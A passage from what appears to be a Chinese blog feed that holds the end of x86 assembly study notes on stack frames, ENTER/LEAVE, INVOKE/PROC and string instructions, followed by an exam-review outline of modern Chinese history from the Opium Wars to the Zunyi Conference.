style="text-align:center">函数的参数个数不能是可变的。</td></tr></tbody></table></blockquote><p>通常子程序在修改寄存器之前就要将它们的值压入栈中进行保存(<code>PUSH</code>)，在子程序返回后恢复原寄存器的值(<code>POP</code>)</p><p>在子过程中，局部变量一般创建于运行时堆栈，通常位于基址指针(<code>EBP</code>)下，我们对其需要将<code>ESP</code>向下开辟对应字节的空间，从子程序退出前也需要将局部变量从堆栈中进行删除</p><p><code>LEA</code>指令返回简介操作数的地址，比如创建了一个局部变量时，不能采用<code>mov esi,OFFSET [EBP-X]</code>的方式将对应的局部变量空间地址赋予给<code>ESI</code>，因为<code>OFFSET</code>只适用于编译时已知的地址。<code>LEA</code>的作用也便是将新开辟的地址空间进行复制操作。</p><p><code>ENTER</code>指令为被调用过程自动创建堆栈帧。它为局部变量保留堆栈空间，把<code>EBP</code>入栈。具体来说,它执行三个操作:</p><ol><li>把EBP入栈(<code>push ebp</code>)</li><li>把EBP设置为堆栈帧的基址(<code>mov ebp,esp</code>)</li><li>为局部变量保留空间(<code>sub esp, numbytes</code>)</li></ol><p>对应结构为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ENTER numbytes, nestinglevel<br></code></pre></td></tr></table></figure><p>这两个操作数都是立即数。<code>Numbytes</code>总是向上舍入为 4 的倍数，以便<code>ESP</code>对齐双字边界。<code>Nestinglevel</code>确定了从主调过程堆栈帧复制到当前帧的堆栈帧指针的个数。</p><blockquote><p>有如下等价关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">enter X,0<br></code></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push ebp<br>mov ebp,esp<br>sub esp,X<br></code></pre></td></tr></table></figure></blockquote><p>一般使用<code>ENTER</code>指令时都需要使用<code>LEAVE</code>进行配合使用，<code>LEAVE</code>指令结束一个过程的堆栈帧，反转了<code>ENTER</code>的指令操作，恢复了<code>ESP</code>和<code>EBP</code>的值</p><blockquote><p>有如下等价关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leave<br></code></pre></td></tr></table></figure><p>等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov esp,ebp<br>pop ebp<br></code></pre></td></tr></table></figure><p><code>POP EBP</code>是先把<code>ESP</code>指向的堆栈元素内容复制到<code>EBP</code>中，再增加<code>ESP</code>的值，此时的<code>ESP</code>对应的地址便是返回地址</p></blockquote><p><code>LOCAL</code>伪指令在过程内部声明一个或多个局部变量，它必须紧跟在<code>PROC</code>伪指令的后面。与全局变量相比,局部变量有独特优势:</p><ol><li>对局部变量名和内容的访问可以被限制在包含它的过程之内。局部变量对程序调试也有帮助,因为只有少数几条程序语句才能修改它们。</li><li>局部变量的生命周期受限于包含它的过程的执行范围。局部变量能有效利用内存，因为同样的存储空间还可以被其他变量使用。</li><li>同一个变量名可以被多个过程使用,而不会发生命名冲突。</li><li>递归过程可以用局部变量在堆栈中保存数值。如果使用的是全局变量，那么每次过程调用自身时,这些数值就会被覆盖。</li></ol><h3 id="递归">递归</h3><p><code>递归子程序</code>是指直接或简介的调用自身的子程序</p><p>一个简单的递归也会占用大量的堆栈空间，在每次过程调用发生时最占用 4 字节的堆栈空间，因为要把返回地址保存到堆栈(对应<code>CALL</code>语句的下一条语句地址)</p><p>假设完成同样的任务，递归子程序所使用的内存空间通常大于非递归子程序</p><h3 id="INVOKE-和-PROC-指令">INVOKE 和 PROC 指令</h3><p><code>INVOKE</code>伪指令(仅限32位模式)能代替<code>CALL</code>指令，它的功能更加强大，可以传递多个参数。用<code>INVOKE</code>伪指令定义过程时，<code>ADDR</code>运算符可以传递指针。</p><blockquote><p><code>ADDR</code>指令用于传递指针，同时只能和<code>INVOKE</code>同时使用，传递给<code>ADDR</code>的参数必须是汇编时常数不能使用<code>[ebp+X]</code>的形式</p></blockquote><p><code>PROC</code>伪指令在声明过程名的同时可以带上已命名参数列表。<code>PROTO</code>伪指令为现有过程创建原型,原型声明过程的名称和参数列表。</p><blockquote><p><code>PROC</code>相当于声明形参，只后会被<code>MASM</code>翻译为对应的汇编语句来开辟对应的栈空间</p></blockquote><p>伪指令的调用先后为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">proto-&gt;invoke-&gt;proc-&gt;endp<br><br>MySub PROTO; 过程原型<br>...<br>INVOKE MySub; 过程调用<br>...<br>MySub PROC; 过程实现<br>...<br>...<br>MySub ENDP<br></code></pre></td></tr></table></figure><h2 id="字符串和数组">字符串和数组</h2><p><code>X86</code>指令集有五组指令用于处理字节、字和双字数组，其被称为<code>字符串原语</code>，其能够高效执行，因为它们会自动重复并增加数组索引</p><p><img src="https://s2.loli.net/2022/07/06/AQJPYMV7tfNvq6C.png" alt="28.png"></p><p>就其自身而言，字符串基本指令只能处理一个或一对内存数值。如果加上重复前缀，指令就可以使用<code>ECX</code>寄存器作为计数器重复执行。重复前缀使得单条指令能够处理整个数组</p><p><img src="https://s2.loli.net/2022/07/06/Tr9EZ746oWwmtyC.png" alt="29.png"></p><blockquote><p>使用方式如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REP<span class="hljs-regexp">/PEPZ/</span>...  MOVSB<span class="hljs-regexp">/CMPSB/</span>...<br></code></pre></td></tr></table></figure><p>格式为：<code>重复前缀 + 字符串基本指令</code></p></blockquote><p>需要注意的是，再重复指令时，我们需要将方向标志位进行置 1 或者置 0 ，通过不同的置位来告诉对应的<code>ESI</code>和<code>EDI</code>是增加还是减少</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">CLD; 方向标志位清零(正向)<br>STD; 方向标志位置 1 (反向)<br></code></pre></td></tr></table></figure><p>当方向标志位清零的时候，程序中对应寄存器代表的的地址是是正向增长，当方向标志位置 1 的时候，对应的地址是逐渐减少。</p><h3 id="二维数组">二维数组</h3><p>高级语言在内存中有两种方式存放数组的行和列：<code>行主序</code>和<code>列主序</code></p><p><code>行主序</code>最常用，第一行的数据存放在内存块开始的位置，第一行存放结束后后面紧跟的是第二行的第一个元素，<code>列主序</code>则是第一列的数据存放在内存块开始的位置，在第一列数据结束后后面紧跟的数据是第二列的第一个元素</p><p>对于二维数组的访问我们常常将其抽象为一个一维数组，通过<code>基址 + 变址操作数</code>或<code>基址 + 变址 + 偏移量操作数</code></p><blockquote><p>基址 + 变址操作数</p><p>[ base + index ]</p><p>通过将两个寄存器相加来产生一个偏移地址</p><p>基址 + 变址 + 偏移量操作数</p><p>[ base + index + displacement ]</p><p>displacement[ base + index ]</p><p>采用的是一个偏移量、一个基址寄存器和一个可选的比例因子来生成有效地址</p><hr><p>两种方式都类似于高级语言中已经寻找到了一个数组的首地址，通过一个单字节的指针来进行寻找每一位的数据，每次指针的增加量便是对应的偏移量，如<code>int</code>类型，占用了 4 字节，那么每次偏移往下找数据时增加的量便为 4</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Assembly</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>中国近代史大纲</title>
    <link href="/2022/06/09/%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2/"/>
    <url>/2022/06/09/%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="西方列强侵占中国领土有哪些？边疆危机是什么？">西方列强侵占中国领土有哪些？边疆危机是什么？</h2><h3 id="侵占领土">侵占领土</h3><p>1842年英国<code>《南京条约》</code>，割让香港岛</p><p>1860年中英<code>《北京条约》</code>，割去香港岛对岸九龙半岛南端和昂船洲</p><p>1849年葡萄牙武力占领澳门半岛，1887年胁迫清政府订立<code>《中葡和好通商条约》</code>，允许“葡萄牙永居管理澳门”</p><p>俄国利用英、法发动第二次鸦片战争，于1858年胁迫黑龙江将军奕山与之签订<code>《瑷珲条约》</code>割去黑龙江以北60万平方公里的领土</p><p>1860年签订中俄<code>《北京条约》</code>，割去乌苏里江以东40万平方公里领土</p><p>1864年，强迫清政府签订<code>《勘分西北界约记》</code>，割去中国西北44万平方公里</p><p>1881年，通过<code>《改定伊犁条约》</code>和5个勘界议定书，歌曲中国西北7万多平方公里，通过一些列不平等条约，俄国共侵占中国领土150多万平方公里</p><p>1895年，中日签订<code>《马关条约》</code>割去中国台湾全岛及所有附属各岛屿和澎湖列岛</p><p>1898年，德国强租山东的胶州湾。沙俄强租辽东半岛的旅顺口、大连湾以及附近海面。英国强租山东的威海卫和香港岛对岸的九龙半岛限街以北、深圳河以南及附近岛屿</p><p>1899年，法国强租广州的广州湾以及附近水面，日本也声明把福建作为其势力范围</p><hr><h3 id="边疆危机">边疆危机</h3><p>19世纪70-90年代中国边疆危机主要有：</p><ol><li><p>西北边疆：中亚浩罕国阿古柏勾结沙俄入侵新疆，清政府派左宗棠率军收复。</p></li><li><p>西南边疆：英国势力侵入西藏、云南。</p></li><li><p>东南边疆：1874年日本侵略我国宝岛台湾，后向中国勒索50万两白银才撤军。1879年3月，日本兼并琉球，琉球国灭亡，其侵略锋芒直指台湾。</p></li><li><p>法国妄图以越南为跳板，侵略云南、广西等处，清政府调淮军南下，在广西边境和福建（当时福建含台湾）沿海激战，中国“不败而败”。</p></li><li><p>1894年，日本借镇压朝鲜“东学党起义”之际，为争夺“宗主权”，出兵朝鲜，悍然挑起中日甲午之战，日本战胜，迫使签订了《马关条约》，由此掀起了列强瓜分中国的狂潮。</p></li></ol><h2 id="反侵略战争失败的原因">反侵略战争失败的原因</h2><ol><li><p>社会制度的腐败</p><blockquote><p>腐败的半殖民地半封建的社会制度，阻碍了中国人民群众的广泛动员和抵抗，是近代中国反侵略斗争屡遭失败的最重要原因</p></blockquote></li><li><p>经济技术的落后</p></li></ol><h2 id="近代中国的社会主要矛盾和两大历史任务">近代中国的社会主要矛盾和两大历史任务</h2><h3 id="两大矛盾">两大矛盾</h3><p>帝国主义和中华民族的矛盾，封建主义和人民大众的矛盾</p><hr><h3 id="两大历史任务">两大历史任务</h3><p>争取民族独立和人民解放、实现国家富强和人民的富裕</p><h2 id="近代中国的社会性质及基本特征">近代中国的社会性质及基本特征</h2><h3 id="社会性质">社会性质</h3><p>近代中国社会是半殖民地半封建社会,鸦片战争前的中国是一个独立的封建大国,鸦片战争后,由于帝国主义列强的侵略,中国社会性质开始发生重大变化,逐渐演变为半殖民地半封建社会。</p><hr><h3 id="基本特征">基本特征</h3><ol><li><p>资本——帝国主义侵略势力不但逐步操纵了中国的财政和经济命脉,而且逐步控制了中国的政治,日益成为支配中国的决定性力量.</p></li><li><p>中国的封建势力日益衰败并同外国侵略势力相勾结,成为资本——帝国主义压迫、奴役中国人民的社会基础和统治支柱.</p></li><li><p>中国的自然经济基础虽然遭到破坏,但是封建剥削制度的根基——大地区内保持着,成为中国走向近代化和民主化的严重障碍.</p></li><li><p>中国新兴的民族资本主义经济虽然已经产生,并在政治、文化生活中起了一定作用,但是在帝国主义封建主义的压迫下,他的发展很缓慢,力量很软弱,而且大部分与外国资本——帝国主义和本国封建主义都有或多或少的联系.</p></li><li><p>由于近代中国处于资本——帝国主义列强的争夺和间接统治之下,近代中国各地区经济、政治和文化的发展是极不平衡的,中国长期处于不统一状态.</p></li></ol><h2 id="洋务运动的兴办和失败的原因">洋务运动的兴办和失败的原因</h2><h3 id="兴办">兴办</h3><p>**目的：**挽救清政府的统治危机</p><p>**兴办近代企业(军工企业)：**曾国藩、李鸿章 —— <code>上海江南制造总局</code>(国内最大兵工厂)、李鸿章 —— <code>南京金陵机器局</code>、左宗棠 —— <code>福州船政局</code>(国内最大造船厂)、崇厚 —— <code>天津机器局</code>、张之洞 —— 汉阳创办<code>湖北枪炮厂</code></p><p><strong>建立新式海陆军</strong></p><p>**创办新式学堂：**翻译学堂(<code>京师同文馆</code>，培养翻译人才)、工艺学堂(培养电报、铁路、矿务、西医等专门人才)、军事学堂(船政学堂)。</p><p><strong>派遣赴美赴欧留学学生</strong></p><hr><h3 id="失败原因">失败原因</h3><ol><li><p>洋务运动具有封建性</p><blockquote><p>以<code>中学为体，西学为用</code>，吸取西方近代生产技术为手段，来进行维护和巩固中国的封建统治</p></blockquote></li><li><p>洋务运动对列强具有依赖性</p><blockquote><p>洋务派官员主张对外“和戎”，其所创办的企业一切仰赖于外国，企图依赖外国来达到“自强”，“求富”的目的</p></blockquote></li><li><p>洋务企业的管理具有腐朽性</p><blockquote><p>洋务派创办的一些新时期呀虽然有一定的资本主义性质，但其管理基本上仍是<code>封建衙门式</code>的。企业内部及其腐败。</p></blockquote></li></ol><h2 id="戊戌维新运动的意义，失败原因，教训">戊戌维新运动的意义，失败原因，教训</h2><h3 id="维新内容">维新内容</h3><ol><li>政治方面：提倡廉政</li><li>经济方面：保护，奖励农工商业与交通采矿业</li><li>军事方面：改练新式陆军，采用西洋兵制</li><li>文化教育：设京师大学堂，废八股</li></ol><blockquote><p>未触及到封建制度的根本，改良方案十分温和</p></blockquote><h3 id="意义">意义</h3><ol><li>一次<code>爱国救亡</code>运动</li><li>一场<code>资产阶级性质</code>的政治改良运动</li><li>一场<code>思想启蒙</code>运动</li></ol><hr><h3 id="失败原因-2">失败原因</h3><p>由于维新派<code>自身的局限</code>以及以慈禧太后为首的强大的<code>守旧势力的反对</code>。</p><p>**局限性：**不敢否定封建主义、对帝国主义抱有幻想、惧怕人民群众</p><hr><h3 id="教训">教训</h3><p>半殖民地半封建的旧中国，企图通过统治者走至上而下的改良道路，是根本行不通的，必须采用革命的手段，推翻帝国主义、封建足以联合统治的半殖民地半封建的社会制度。</p><h2 id="辛亥革命的历史意义，失败原因">辛亥革命的历史意义，失败原因</h2><h3 id="意义-2">意义</h3><ol><li>推翻了清王朝的统治；</li><li>结束了封建君主专制制度，建立了中国第一个资产阶级共和政府;</li><li>一场思想解放运动;</li><li>促进了民族资本主义经济的发展;</li><li>打击了帝国主义在华势力。</li></ol><hr><h3 id="失败原因-3">失败原因</h3><p>辛亥革命的失败是指没有完成反帝反封建的任务</p><ol><li><p>帝国主义时代半殖民地半封建的中国，资本主义的建国方案行不通(根本原因)</p></li><li><p>没有彻底的反帝反封建的革命纲领，不能充分发动和依靠人民群众</p></li><li><p>不能建立坚强的革命政党，作为团结一切革命力量强有力的核心</p><blockquote><p>源于其软弱性和妥协性，而赶跑了一个皇帝却没能改变封建主义与官僚的统治基础</p></blockquote></li></ol><h2 id="民族意识的觉醒（表现在哪）">民族意识的觉醒（表现在哪）</h2><ol><li><p>“师夷长技以制夷”的主张和早期的维新思想</p><blockquote><p>通过收集、翻译传入的外国报刊、书籍、地图，以及战争中审问英军俘虏和向外国商人、传教士直接询问等各种方式，来获取世界知识。</p><p><code>林则徐是近代中国睁眼看世界的第一人。</code></p><p>在《海国图志》中，魏源提出了“师夷长技以制夷”的思想，主张学习外国先进的军事和科学技术，以期富国强兵，抵御外国侵略，开创了中国近代向西方学习的新风。</p><p>严复《救亡决论》喊出了“救亡”口号</p><p>郑观应在其著作《盛世危言》中主张与西方国家“商战”。</p><p>孙中山提出了“振兴中华”的口号</p></blockquote></li><li><p>救亡图存和振兴中华</p><blockquote><p>民族危机激发了中华民族的觉醒，增强了中华民族的凝聚力。中国自古以来的“天下兴亡，匹夫有责”的优良传统，得到了发扬和升华。救亡图存成了时代的主旋律。</p></blockquote></li></ol><h2 id="太平天国">太平天国</h2><p>太平天国提出的纲领性文件是<code>《天朝田亩制度》</code>，后期还提出了<code>《资政新篇》</code>。</p><blockquote><p>《天朝田亩制度》：具有浓厚的封建性</p><ol><li>确定平均分配土地方案</li><li>规定农，副业产品生产与分配</li></ol><p>《资政新篇》：具有资本主义色彩，但局限于时代而未能够实施</p></blockquote><p>天京事变严重的削弱了太平天国的领导和军事力量，成为太平天国由盛转衰的分水岭</p><p><strong>意义：</strong></p><ol><li><p>加速了清王朝和整个封建制度的衰落与崩溃。</p></li><li><p>在反封建主义的同时，又担负起反对外来侵略的任务。对外国侵略者开展了大规模的武装斗争，打破了西方侵略者把中国迅速殖民地化的企图。</p></li><li><p>同中国以往的农民战争相比，在思想上、组织上，它都高出一筹，是几千年来中国农民战争的最高峰，对后来中国人民反帝反封建的斗争有深远影响。</p></li><li><p>太平天国的领袖还主张与各国通商贸易，后期又提出了第一个在中国发展资本主义的方案。</p></li><li><p>19世纪中叶，亚洲出现了第一次民族解放运动高潮。太平天国运动同波斯、印度尼西亚、印度等国人民的反殖民主义斗争，相互推动、相互影响，共同打击了西方殖民主义者。</p></li></ol><p><strong>教训：</strong></p><ol><li>农民阶级无法克服小生产者所固有的阶级局限性，无法制止和克服领导集团自身腐败现象的滋长，无法长期保持领导集团的团结。这一切都大大削弱了向心力和战斗力。</li><li>以宗教来发动组织群众，不仅不能正确指导战争，而且给农民战争带来了危害。</li><li>太平天国未能正确的对待儒学。</li><li>对于西方资本主义侵略者缺乏理性的认识。</li></ol><h2 id="孙中山与资产阶级民主革命的开始">孙中山与资产阶级民主革命的开始</h2><p>1894年11月，孙中山到檀香山组建了<code>第一个革命团体兴中会</code>，立誓“驱除鞑虏，恢复中国，创立合众政府”。</p><p>1904年，孙中山发表《中国问题的真解决》一文，表明以孙中山为首的资产阶级革命派在踏上革命这条道路之时，就高举起民主革命的旗帜，并选择了以武装起义推翻清王朝的统治的斗争方式。这也是中国资产阶级革命派与改良派的根本不同。</p><h2 id="三民主义">三民主义</h2><p><strong>三大主义：</strong><code>民族、民权、民生</code></p><blockquote><p>民族主义：</p><p>“驱除鞑虏，恢复中华”(基本内容)，以革命手段推翻清政府，改变它一贯推行的民族歧视和民族压迫政策。建立中华民族“独立的国家”(基本任务)</p><p>缺陷：没有从<code>正面</code>鲜明地提出<code>反对帝国主义</code>的主张</p><p>民权主义：</p><p>“创立民国”(基本内容)，推翻封建君主专制制度，建立资产阶级民主共和国(基本任务)</p><p>缺陷：<code>没有提出推翻地主豪绅阶级的统治</code></p><p>民生主义：</p><p>“平均地权”(基本内容)，既使中国富强，又避免产生贫富悬殊的现象，避免社会危机</p><p>缺陷：带有浓厚的<code>空想色彩</code>，在实践上<code>缺乏社会基础</code></p></blockquote><p><strong>新旧三民主义的区别：</strong></p><p>1、在民族主义方面，旧三民主义所突出的是“反满”，矛头指向清王朝，要求“驱除鞑虏，恢复中华”；新三民主义则提出了反对帝国主义的目标，认清了国内反动势力和帝国主义的本质及关系，以及对中国革命的危害。</p><p>2、在民权主义方面，旧三民主义只是抽象地提倡“自由、平等、博爱”，基本内容是：揭露和批判封建专制主义，指出封建的社会政治制度剥夺了人权；新三民主义主张普遍平等的民权，强调国家政权为“一般平民所共有”，即强调它的人民性、群众性。</p><p>3、在民生主义方面，旧三民主义只有“平均地权”的政纲；新三民主义则提出了平均地权和节制资本的办法，承认“耕者有其田”，并谋求改善工人和农民的生活。</p><p>4、在提出的历史背景方面：旧三民主义在清政府统治日益腐败,资产阶级民主革命思想进一步传播,他们以西方资产阶级的天赋人权,自由平等等学说作为思想武器；新三民主义则在一战后，“打倒列强，除军阀”成为全国人民的共同愿望的背景下提出的。</p><h2 id="中华民国临时约法">中华民国临时约法</h2><p>**背景：**1912年1月1日，孙中山在南京宣誓就职，改国号为<code>中华民国</code>，定1912年为民国元年，并成立<code>中华民国临时政府</code></p><p><strong>性质：</strong><code>中国历史上第一部具有资产阶级共和国宪法性质的法典</code></p><p>**相关意义：**临时约法是资产阶级民主革命的产物，是资产阶级宪法性质的文献，它宣告封建君主专制制度的灭亡，资产阶级民主共和国的诞生。从此，使民主共和的观念深入人心，临时约法不仅具有反对封建君主专制制度的意义，而且也寓意含有反对帝国主义侵略反对民族分裂的作用。</p><p><strong>缺点：</strong><code>没有</code>规定<code>反帝反封建</code>的民主革命纲领，没有解决农民的<code>土地问题</code>，因此它不能得到<code>广大人民群众的支持</code>。</p><p><strong>局限性：</strong></p><ol><li><p>没有具体规定人民的权利，以及实现权利的保障；</p></li><li><p>没有采取地方分权制，不利于民国的巩固；</p></li><li><p>没有贯彻五权宪法的理论。</p></li></ol><h2 id="五四运动">五四运动</h2><p>**时间点：**1919年5月4日</p><p><strong>历史特点：</strong></p><p>1、五四运动表现了<code>反帝反封建的彻底性</code>。</p><p>2、五四运动是一次<code>真正的群众运动</code>。辛亥革命的根本弱点之一，是没有广泛地动员和组织群众，那么，五四运动本身就是一场群众性的革命运动。</p><p>3、五四运动促进了<code>马克思主义</code>在中国的<code>发展、传播</code>。</p><p>4、五四运动是由<code>学生先发起</code>，<code>由工人扩大</code>的坚决的<code>反帝反封建的人民运动</code>。</p><p>5、五四爱国运动，是一次彻底地反对帝国主义和封建主义的爱国运动，是<code>无产阶级领导的新民主主义的开端</code>。</p><p><strong>历史意义：</strong></p><p>1、是一次彻底地反对帝国主义和彻底地反对封建主义的爱国运动。</p><p>2、无产阶级开始登上了政治舞台，起了主力军的作用；青年学生发挥了先锋作用。</p><p>3、五四运动是<code>中国新民主主义革命的开端</code>。</p><p>4、五四运动促进了马克思主义在中国的广泛传播，促进了马克思主义与中国工人运动相结合，从思想上和干部上为中国共产党的成立做了准备。</p><hr><h3 id="为什么说五四运动是新民主主义的开端？">为什么说五四运动是新民主主义的开端？</h3><p>五四运动以彻底反帝反封建的革命性、追求救国强国真理的进步性、各族各界群众积极参与的广泛性，推动了中国社会进步，促进了马克思主义在中国的广泛传播，促进了马克思主义同中国工人运动的结合，为中国共产党成立做了思想上干部上的准备。五四运动孕育了以爱国、进步、民主、科学为主要内容的伟大五四精神，其核心是爱国主义精神，在近代以来中华民族追求民族独立和发展进步的历史进程中具有里程碑意义。</p><h2 id="新文化运动">新文化运动</h2><p>**开始：**1915年9月陈独秀在上海创办<code>《青年杂志》</code>(后改名为《新青年》)</p><p><strong>阵地：</strong>《新青年》杂志和北京大学</p><p><strong>基本口号：</strong></p><p>拥护“德先生”（Democracy）和“赛先生”（Science），就是提倡民主和科学。当封建主义在社会生活中占据支配地位的时候，<code>提倡民主、反对独裁专制，提倡科学、反对迷信盲从</code>，有着历史的进步意义</p><p><strong>新文化运动的评价：</strong><br>新文化运动是一次前所未有的<code>思想解放运动</code>，它高举民主和科学的大旗，引导人们同封建专制和封建思想展开彻底的斗争，打破了传统的精神枷锁，促使人们更加积极地追求救国救民的真理，为马克思主义在中国的传播创造了条件。但是也有着对东西方文化的绝对肯定和否定，<code>缺乏群众基础</code>的局限性。</p><p><strong>新文化运动的历史意义：</strong></p><ol><li><code>动摇了封建思想的统治地位。</code>新文化运动前，资产阶级维新（改良）派和革命派，在宣传各自的政治观点时，都没有彻底地批判封建思想。经过新文化运动，封建思想遭到前所未有的冲击批判，人们的思想得到空前的解放。</li><li><code>民主和科学思想得到弘扬。</code>中国知识分子在新文化运动中，受到一次西方民主和科学思想的洗礼。这就为新思潮的传播开辟了道路，也推动了中国自然科学事业的发展。</li><li><code>为五四运动的爆发作了思想准备。</code>新文化运动启发了民众的民主主义觉悟，对五四爱国运动起了宣传动员作用。</li><li>后期传播的社会主义思想，<code>启发了中国先进的知识分子</code>，使他们选择和接受了马克思主义，作为拯救国家、改造社会和推进革命的<code>思想武器</code>。这是新文化运动最重要的成果。</li><li><code>有利于文化的普及和繁荣。</code>新文化运动提倡白话文，能够使语言和文字更紧密地统一起来，为广大民众所接受，从而有利于文化的普及与繁荣。</li></ol><p><strong>进步性：</strong><br>进步性民主和科学思想的弘扬，动摇了封建思想的统治地位，并且推动了中国自然科学的发展，使人们的思想尤其是青年的<code>思想</code>得到空前的<code>解放</code>。后期传播的马克思主义，为中国先进的知识分子所接受，成为拯救国家、改造社会的<code>思想武器</code>。对五四运动的爆发起到了宣传动员作用，也有利于<code>文化的普及和繁荣</code>。局限性新文化运动是由资产阶级激进民主主义者发动的。</p><p><strong>局限性：</strong></p><p>运动的倡导者<code>忽视人民群众</code>，没有把新文化运动同广大群众相结合，使文化运动局限在知识分子的圈子里。他们还回避当时对军阀政府的实际斗争，也没有正面提出反帝的任务。以当时的文学革命而论，虽然提出建设“国民文学”，但当时的文学活动也只限于一部分知识分子中，还没有可能普及到工农群众中去。<code>对中国古典文学的一味批判以及对西学的全盘肯定具有片面性。</code></p><h2 id="中国共产党的成立是开天辟地的大事件，为什么？">中国共产党的成立是开天辟地的大事件，为什么？</h2><p>中国共产党的成立是中华民族发展史上一个开天辟地的大事件，从此中国人民有了一个先进的坚强的政党作为凝聚自己力量的领导核心，踏上了争取民族独立，自身解放的光明道路，开启了实现国家富强，人民富裕的历史进程。深刻改变了近代以后中华民族发展的方向和进程。深刻改变了中国人民和中华民族的前途和命运，改变了世界发展趋势和世界进程。</p><h2 id="建党精神">建党精神</h2><p>坚持真理、坚守理想，践行初心、担当使命，不怕牺牲、英勇斗争，对党忠诚、不负人民</p><h2 id="长征精神">长征精神</h2><p>长征精神的基本内涵是：</p><ol><li>把全国人民和中华民族的根本利益看得高于一切，<code>坚定革命的理想和信念，坚信正义事业必然胜利的精神</code>；</li><li>为了救国救民，不怕任何艰难险阻，不惜付出一切<code>牺牲的精神</code>；</li><li>坚持独立自主、实事求是，一切<code>从实际出发的精神</code>；</li><li><code>顾全大局、严守纪律、紧密团结的精神</code>；</li><li>紧紧<code>依靠人民群众，同人民群众生死相依、患难与共、艰苦奋斗的精神</code>。</li></ol><h2 id="国共第一次合作">国共第一次合作</h2><p>**时间：**从1924年1月起至1927年7月止，历时三年半</p><p>**标志：**1924年1月，在广州召开的中国国民党第一次全国代表大会通过的宣言重新阐释了三民主义，确定了联俄、联共、扶助农工的三大政策，标志着国共第一次合作正式形成。(国民党一大的召开)</p><p><strong>合作成果：</strong></p><ol><li><p>中共帮助国民党组建省、市地方党部。许多共产党员担任国民党省市级党部负责人；</p></li><li><p>中共和共产国际帮助国民党创建黄埔军校和国民革命军，为革命军队培养造就了一批军政人才；</p></li><li><p>工农运动得到大力开展。中共领导了广州沙面罢工和海陆丰农民运动，并且帮助国民党在广州创办了六届农民运动讲习所；</p></li><li><p>1925年1月，中共四大召开，首次明确提出无产阶级领导权和农民同盟军问题。中共四大以后，全国掀起国民会议运动、五卅运动和省港大罢工，把革命推向高潮；</p></li><li><p>经过两次东征和南征，广东革命根据地得到了统一和巩固；</p></li><li><p>长期沉寂的北方革命运动得到前所未有的发展。</p></li></ol><p><strong>失败原因：</strong></p><p>大革命的失败，从客观方面讲，是由于反革命力量强大，资产阶级发生严重动摇，蒋介石集团、汪精卫集团先后叛变革命。</p><p>从主观方面说，这时党还处在幼年时期，缺乏应对复杂环境的政治经验，还不善于将马克思主义基本原理同中国革命具体实际结合起来。</p><p><strong>经验教训：</strong></p><ol><li><p>建立国共合作统一战线是必要的、正确的，但必须坚持统一战线中的无产阶级领导权，对资产阶级实行又联合又斗争的政策，这是革命成败的关键；</p></li><li><p>农民是无产阶级的可靠同盟军，农民问题是无产阶级领导的中心问题，必须放手发动农民，坚决依靠农民，建立巩固的工农联盟；</p></li><li><p>武装斗争是中国革命的特点，必须重视武装斗争，建立党和人民直接掌握的革命军队</p></li></ol><h2 id="中国共产党成立后，中国革命呈现出的新面貌">中国共产党成立后，中国革命呈现出的新面貌</h2><ol><li><p>制定了革命的纲领，发动工农运动</p><blockquote><p>中共二大第一次提出反帝反封建的民主革命纲领，为中国人民指出了明确的斗争目标</p></blockquote></li><li><p>发动工农群众开展革命斗争</p><blockquote><p>中国共产党成立后，党的工作重点在发展工人运动上面。从1922年1月香港海员罢工(不为中国共产党领导的)到1923年2月京汉铁路工人罢工，在中国共产党的领导、组织、推动下，中国掀起了第一个工人运动的狂潮</p></blockquote></li><li><p>实行国共合作，并在合作中发挥主导作用，进行了北伐战争，掀起大革命高潮</p></li></ol><h2 id="遵义会议的内容和历史意义">遵义会议的内容和历史意义</h2><p><strong>遵义会议作出的四条决定(主要内容)：</strong></p><ol><li><p>毛泽东同志选为常委；</p></li><li><p>指定洛甫同志起草决议，委托常委审查后，发到支部中去讨论；</p></li><li><p>常委中再进行分工；</p></li><li><p>取消“三人团”，仍由最高军事首长朱德、周恩来为军事指挥者，而周恩来同志是党内委托的对于指挥军事上下最后决心的负责者。</p></li><li><p>肯定了毛泽东同志的正确主张。</p></li></ol><p><strong>会议意义：</strong></p><p>遵义会议结束了王明“左”倾冒险主义路线在党中央的统治，确立了以毛泽东为代表的新的中央正确领导，把党的路线转到了马克思列宁主义的轨道上来。</p><p>遵义会议，在中国革命的危急关头，挽救了党，挽救了红军，挽救了中国革命，是我党历史上一个生死攸关的转折点(中国共产党由幼年转变为成熟的标志)。</p><h2 id="毛泽东的主要著作论文（著述）">毛泽东的主要著作论文（著述）</h2><h3 id="《中国社会各阶级的分析》-1925年">《中国社会各阶级的分析》 1925年</h3><p>1.分析了中国资产阶级的特殊情况，科学地划分为买办资产阶级和民族资产阶级，指出各自的政治态度；</p><p>2.指出国民革命的中心问题是农民问题；</p><p>3.揭示了中国革命的对象；</p><p>4.提出“谁是我们的敌人？谁是我们的朋友？这个问题是革命的首要问题。”阐明认清对象对革命胜利的极端重要性。</p><hr><h3 